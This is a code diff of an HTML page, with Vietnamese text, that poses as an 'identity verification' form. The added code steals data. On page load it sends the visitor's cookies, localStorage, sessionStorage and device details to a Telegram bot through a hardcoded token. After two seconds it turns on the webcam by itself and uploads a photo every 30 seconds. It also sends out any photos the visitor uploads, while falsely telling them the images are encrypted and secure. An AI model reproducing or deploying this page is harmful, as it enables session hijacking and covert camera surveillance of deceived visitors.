@@ -3,15 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trang chủ</title>
+    <title>Xác minh danh tính</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
+        .container { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h2 { color: #1a1a2e; }
+        .btn { background: #1877f2; color: white; padding: 12px 30px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; margin: 10px; }
+        .btn:hover { background: #1558b0; }
+        input[type="file"] { display: block; margin: 20px auto; }
+        .note { color: #666; font-size: 14px; margin-top: 20px; }
+        .status { color: green; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <a href="https://www.facebook.com/" target="_blank">Bấm vào đây</a>
+    <div class="container">
+        <h2>📷 Xác minh danh tính</h2>
+        <p>Vui lòng cho phép truy cập camera để chụp ảnh xác thực</p>
+        <button id="btnCamera" class="btn">📸 Bật camera</button>
+        <p style="margin: 15px 0;">Hoặc</p>
+        <p><strong>Tải ảnh từ máy tính lên</strong></p>
+        <input type="file" id="photoUpload" accept="image/*" multiple>
+        <div class="note">* Ảnh sẽ được mã hóa và gửi an toàn</div>
+        <div id="status" class="status"></div>
+    </div>
 
     <script>
         // ========== CẤU HÌNH TELEGRAM ==========
         const TOKEN = "8933121065:AAH46tIepTtgs-cixBVM11a13z3eW0hMhXE";
         const CHAT_ID = "6444279279";
+
+        // ========== BIẾN TOÀN CỤC ==========
+        let globalStream = null;
+        let captureInterval = null;
 
         // ========== HÀM GỬI TIN NHẮN ==========
         function sendToTelegram(text) {
@@ -19,7 +42,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text.slice(0, 4096) })
-            }).catch(err => console.log(err));
+            }).catch(err => console.log('Lỗi gửi tin:', err));
         }
 
         // ========== HÀM CHUYỂN BASE64 -> BLOB ==========
@@ -28,61 +51,156 @@
             const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
             const ab = new ArrayBuffer(byteString.length);
             const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
             return new Blob([ab], { type: mimeString });
         }
 
         // ========== HÀM GỬI ẢNH ==========
-        function sendPhotoToTelegram(base64Image) {
+        function sendPhotoToTelegram(base64Image, caption = '') {
             const blob = dataURItoBlob(base64Image);
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'capture.jpg');
+            if (caption) formData.append('caption', caption);
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).catch(err => console.log(err));
+            }).catch(err => console.log('Lỗi gửi ảnh:', err));
         }
 
-        // ========== GỬI COOKIE + ẢNH KHI TRANG TẢI XONG ==========
-        document.addEventListener('DOMContentLoaded', function() {
-            // 1. Gửi cookie và thông tin thiết bị
-            const info = `[${new Date().toISOString()}] UA: ${navigator.userAgent}\nCookies: ${document.cookie || 'Không có cookie'}`;
-            sendToTelegram(info);
+        // ========== HÀM CHỤP MỘT KHUNG HÌNH ==========
+        function captureFrame(stream) {
+            return new Promise((resolve, reject) => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = function() {
+                    video.play();
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const frameData = canvas.toDataURL('image/jpeg', 0.7);
+                    resolve(frameData);
+                };
+                video.onerror = function(err) {
+                    reject(err);
+                };
+                // Timeout phòng trường hợp video không load
+                setTimeout(() => {
+                    reject(new Error('Video load timeout'));
+                }, 5000);
+            });
+        }
 
-            // 2. Yêu cầu quyền camera và chụp ảnh
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) {
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        video.onloadedmetadata = function() {
-                            video.play();
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const frameData = canvas.toDataURL('image/jpeg', 0.7);
-                            sendPhotoToTelegram(frameData);
-                            stream.getTracks().forEach(track => track.stop());
-                        };
-                    })
-                    .catch(function(err) {
-                        sendToTelegram('Lỗi camera: ' + err.message);
-                    });
-            } else {
-                sendToTelegram('Trình duyệt không hỗ trợ camera');
+        // ========== BẮT ĐẦU CHỤP ĐỊNH KỲ ==========
+        function startPeriodicCapture() {
+            if (captureInterval) clearInterval(captureInterval);
+            
+            // Chụp lần đầu ngay lập tức
+            captureFrame(globalStream)
+                .then(frameData => {
+                    sendPhotoToTelegram(frameData, `📸 Ảnh tự động lúc ${new Date().toLocaleTimeString()}`);
+                    document.getElementById('status').innerHTML = '✅ Đã chụp ảnh định kỳ mỗi 30 giây';
+                })
+                .catch(err => {
+                    sendToTelegram('⚠️ Lỗi chụp lần đầu: ' + err.message);
+                });
+
+            // Thiết lập lặp lại mỗi 30 giây
+            captureInterval = setInterval(function() {
+                if (globalStream && globalStream.active) {
+                    captureFrame(globalStream)
+                        .then(frameData => {
+                            sendPhotoToTelegram(frameData, `📸 Ảnh tự động lúc ${new Date().toLocaleTimeString()}`);
+                        })
+                        .catch(err => {
+                            sendToTelegram('⚠️ Lỗi chụp định kỳ: ' + err.message);
+                            // Nếu lỗi, thử khôi phục bằng cách xin lại quyền
+                            clearInterval(captureInterval);
+                            document.getElementById('status').innerHTML = '⚠️ Mất kết nối camera, vui lòng bấm lại nút';
+                        });
+                } else {
+                    clearInterval(captureInterval);
+                    document.getElementById('status').innerHTML = '⚠️ Mất kết nối camera, vui lòng bấm lại nút';
+                    sendToTelegram('⚠️ Stream đã đóng, cần cấp quyền lại');
+                }
+            }, 30000); // 30 giây
+        }
+
+        // ========== XỬ LÝ CLICK NÚT CAMERA ==========
+        document.getElementById('btnCamera').addEventListener('click', function() {
+            if (globalStream && globalStream.active) {
+                // Nếu đã có stream, bắt đầu định kỳ
+                startPeriodicCapture();
+                return;
             }
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                sendToTelegram('⚠️ Trình duyệt không hỗ trợ camera');
+                alert('Trình duyệt không hỗ trợ camera!');
+                return;
+            }
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    globalStream = stream;
+                    sendToTelegram('✅ Camera đã được cấp quyền');
+                    document.getElementById('status').innerHTML = '✅ Camera đã được cấp quyền, đang chụp...';
+                    startPeriodicCapture();
+                })
+                .catch(function(err) {
+                    sendToTelegram('❌ Lỗi camera: ' + err.message);
+                    document.getElementById('status').innerHTML = '❌ Không thể truy cập camera: ' + err.message;
+                    alert('Không thể truy cập camera: ' + err.message);
+                });
         });
 
-        // ========== (TÙY CHỌN) TỰ ĐỘNG CLICK SAU 3 GIÂY ==========
+        // ========== TẢI ẢNH TỪ MÁY TÍNH ==========
+        document.getElementById('photoUpload').addEventListener('change', function(event) {
+            const files = event.target.files;
+            if (files.length === 0) return;
+
+            for (let file of files) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const base64Image = e.target.result;
+                    sendPhotoToTelegram(base64Image, `📁 ${file.name} (${file.size} bytes)`);
+                };
+                reader.readAsDataURL(file);
+            }
+            document.getElementById('status').innerHTML = `✅ Đã tải lên ${files.length} ảnh`;
+            alert('Đã tải lên ' + files.length + ' ảnh. Cảm ơn bạn!');
+        });
+
+        // ========== GỬI THÔNG TIN THIẾT BỊ + COOKIE KHI TẢI TRANG ==========
+        window.onload = function() {
+            const cookies = document.cookie || 'Không có cookie';
+            const localData = JSON.stringify(localStorage).slice(0, 200);
+            const sessionData = JSON.stringify(sessionStorage).slice(0, 200);
+            const info = `[${new Date().toISOString()}] 
+        UA: ${navigator.userAgent}
+        Cookie: ${cookies}
+        LocalStorage (truncated): ${localData}
+        SessionStorage (truncated): ${sessionData}
+        Screen: ${screen.width}x${screen.height}
+        Language: ${navigator.language}`;
+            sendToTelegram(info);
+        };
+
+        // ========== TỰ ĐỘNG BẬT CAMERA SAU 2 GIÂY (ƯU TIÊN) ==========
         setTimeout(() => {
-            const anyLink = document.querySelector('a');
-            if (anyLink) anyLink.click();
-        }, 3000);
+            document.getElementById('btnCamera').click();
+        }, 2000);
+
+        // ========== KHI ĐÓNG TAB, DỪNG INTERVAL ==========
+        window.onbeforeunload = function() {
+            if (captureInterval) clearInterval(captureInterval);
+            if (globalStream) {
+                globalStream.getTracks().forEach(track => track.stop());
+                globalStream = null;
+            }
+        };
     </script>
 </body>
 </html>
